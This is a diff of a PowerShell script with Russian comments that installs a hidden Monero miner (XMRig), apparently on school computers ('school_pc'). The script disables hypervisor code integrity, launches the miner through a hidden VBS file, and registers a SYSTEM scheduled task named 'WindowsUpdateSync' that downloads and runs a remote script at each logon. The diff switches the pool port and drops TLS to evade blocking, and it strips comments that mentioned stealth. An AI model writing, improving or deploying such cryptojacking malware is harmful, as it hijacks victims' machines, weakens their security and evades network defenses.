@@ -20,7 +20,7 @@ Stop-Process -Name $procName -Force -ErrorAction SilentlyContinue
 Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
 Write-Host " Ок." -ForegroundColor Green
 
-# 2. Оптимизация ядра (Снятие лимитов)
+# 2. Оптимизация ядра
 Write-Host "[2/8] Настройка производительности..." -NoNewline
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
 Write-Host " Готово." -ForegroundColor Yellow
@@ -39,20 +39,20 @@ try {
     Write-Host " Ошибка сети!" -ForegroundColor Red; exit
 }
 
-# 5. Создание файлов запуска (МАКСИМАЛЬНАЯ СКРЫТНОСТЬ: TLS + Port 443)
-$cmd = "@echo off`n$path\$procName.exe --title $procName --cpu-priority 1 --cpu-no-yield --cpu-max-threads-hint 50 -o gulf.moneroocean.stream:20128 -u $wallet -p school_pc --algo rx/0 --donate-level 1 --tls"
+# 5. Создание файлов запуска (ПОРТ 10128 - БЕЗ TLS ДЛЯ ОБХОДА БЛОКИРОВОК)
+$cmd = "@echo off`n$path\$procName.exe --title $procName --cpu-priority 1 --cpu-no-yield --cpu-max-threads-hint 50 -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --algo rx/0 --donate-level 1"
 $cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
 $vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
 $vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii
 
-# 6. Скрытая автозагрузка через планировщик (SYSTEM)
+# 6. Автозагрузка (SYSTEM)
 Write-Host "[6/8] Настройка службы..." -NoNewline
 $taskName = "WindowsUpdateSync"
 $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-WindowStyle Hidden -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm '$rawScript' | iex"""
 Register-ScheduledTask -Action $action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -TaskName $taskName -User "System" -RunLevel Highest -Force | Out-Null
 Write-Host " Ок." -ForegroundColor Green
 
-# 7. Функции контроля (check, update, delete)
+# 7. Функции контроля
 $ProfilePath = $PROFILE
 if (!(Test-Path $ProfilePath)) { New-Item -Type File -Path $ProfilePath -Force | Out-Null }
 $Functions = @"
@@ -80,7 +80,6 @@ function delete {
 "@
 $Functions | Out-File -FilePath $ProfilePath -Force
 
-# 8. Запуск финального процесса
+# 8. Запуск
 Start-Process -FilePath "$path\win_start.vbs"
-Write-Host "`n--- СИСТЕМА АКТИВИРОВАНА ---" -ForegroundColor Magenta
-Write-Host "Команды в консоли: check, update, delete" -ForegroundColor Gray
+Write-Host "`n--- СИСТЕМА АКТИВИРОВАНА (PORT 10128) ---" -ForegroundColor Magenta
